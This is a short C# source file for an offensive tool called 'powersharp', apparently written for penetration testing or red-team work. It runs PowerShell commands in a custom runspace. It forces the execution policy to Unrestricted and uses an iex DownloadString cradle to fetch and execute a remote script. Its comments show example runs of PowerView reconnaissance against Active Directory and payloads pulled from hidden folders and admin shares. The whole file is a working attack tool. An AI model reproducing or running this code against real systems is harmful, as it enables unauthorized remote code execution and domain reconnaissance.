using System;
using System.Collections.ObjectModel;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Text;

namespace powersharp
{
    class Program
    {
        static void Main(string[] args)
        {
            //Example Input: powersharp.exe -m http://192.168.0.100/powerview.ps1 -c "Get-NetUser | select samaccountname"
            //Example Input: powersharp.exe -m C:\windows\tasks\powerview.ps1 -c "Get-NetComputer | select dnshostname"
            //Example Input: powersharp.exe -m C:\windows\tasks\payload.ps1 
            //Example Input: powersharp.exe -m "\\\\WEB01\\C$\\windows\\tasks\\payload.ps1" 
            //Example Input: powersharp.exe -c "$ExecutionContext.SessionState.LanguageMode"
            String module = args[0];
            String command = args[1];
            if (module.Contains("http"))
            {
                command = "Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted -Force;iex(New-Object Net.Webclient).DownloadString('" + module + "')" + ";" + command;

            }
            else
            {
                command = "Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted -Force;ipmo " + module+";" + command;
            }
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(command);
            StringBuilder stringBuilder = new StringBuilder();
            Collection<PSObject> output=ps.Invoke();
            foreach (PSObject O in output)
            {
                stringBuilder.AppendLine(O.ToString()+"\n");                     
            }
            Console.WriteLine(stringBuilder);
            rs.Close();
        }
    }
}